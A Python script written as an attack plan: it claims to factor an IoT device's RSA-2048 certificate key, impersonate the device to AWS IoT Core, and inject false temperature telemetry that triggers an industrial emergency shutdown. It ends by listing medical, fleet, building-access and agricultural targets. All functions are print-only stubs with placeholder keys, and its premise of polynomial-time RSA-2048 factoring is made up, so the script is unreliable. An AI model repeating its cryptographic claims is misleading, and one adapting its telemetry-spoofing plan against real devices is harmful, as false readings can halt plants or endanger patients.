"""
Factor an AWS IoT device's RSA-2048 certificate stored in ESP32 NVS flash,
impersonate the device to AWS IoT Core, and inject false sensor telemetry
that triggers automated industrial responses.
"""

import sys, json, hashlib, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

AWS_IOT_ENDPOINT = "a1b2c3d4e5f6g7.iot.us-east-1.amazonaws.com"
MQTT_TOPIC_TELEMETRY = "$aws/things/{thing_name}/shadow/update"
MQTT_TOPIC_COMMAND   = "$aws/things/{thing_name}/jobs/notify"


def extract_device_pubkey_from_tls(iot_endpoint: str, thing_name: str) -> bytes:
    """Extract device RSA-2048 public key from a captured TLS handshake.
    AWS IoT Core mTLS — device cert sent in ClientCertificate message."""
    print(f"    IoT endpoint: {iot_endpoint}")
    print(f"    thing: {thing_name}")
    print("    RSA-2048 device cert from TLS ClientCertificate")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_device_key(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def connect_as_device(endpoint: str, thing_name: str, forged_cert: bytes,
                      forged_key: bytes):
    """Establish MQTT over mTLS to AWS IoT Core as the target device."""
    print(f"    MQTT CONNECT to {endpoint}:8883")
    print(f"    client_id: {thing_name}")
    print("    mTLS with forged device cert — IoT Core authenticates")


def publish_false_telemetry(thing_name: str, sensor_type: str,
                            false_value: float):
    """Publish false sensor readings to the device shadow."""
    topic = MQTT_TOPIC_TELEMETRY.format(thing_name=thing_name)
    payload = json.dumps({
        "state": {
            "reported": {
                sensor_type: false_value,
                "timestamp": int(time.time()),
                "firmware": "v2.1.3",
            }
        }
    })
    print(f"    PUBLISH {topic}")
    print(f"    {sensor_type}: {false_value}")


def trigger_automated_response(thing_name: str, rule_name: str):
    """IoT Rule Engine evaluates the false telemetry and triggers action."""
    print(f"    IoT Rule '{rule_name}' evaluates shadow update")
    print(f"    Lambda function invoked — automated response triggered")


if __name__ == "__main__":
    print("[*] AWS IoT device certificate RSA-2048 attack")
    thing = "industrial-temp-sensor-0417"

    print(f"[1] extracting device cert for {thing}")
    cert = extract_device_pubkey_from_tls(AWS_IOT_ENDPOINT, thing)
    print("    10-year validity, RSA-2048, stored in ESP32 NVS flash")

    print("[2] factoring device RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — device identity compromised")

    print("[3] connecting to AWS IoT Core as target device")
    connect_as_device(AWS_IOT_ENDPOINT, thing, b"CERT", b"KEY")

    print("[4] publishing false telemetry: temperature spike")
    publish_false_telemetry(thing, "temperature_c", 185.0)
    print("    actual temperature: 22.0°C")
    print("    reported: 185.0°C (above critical threshold)")

    print("[5] automated response triggered")
    trigger_automated_response(thing, "HighTempEmergencyShutdown")
    print("    industrial process emergency shutdown initiated")
    print("    production line halted — physical inspection required")

    print("[6] additional attack vectors:")
    print("    - medical IoT: false glucose/vitals into hospital monitoring")
    print("    - fleet GPS: falsify location for entire logistics fleet")
    print("    - smart building: 'door unlocked' events to SIEM")
    print("    - agriculture: false soil moisture -> irrigation override")
    print("[*] AWS IoT default is RSA-2048; billions of devices deployed")
    print("[*] device certs often 10-year validity, no rotation")
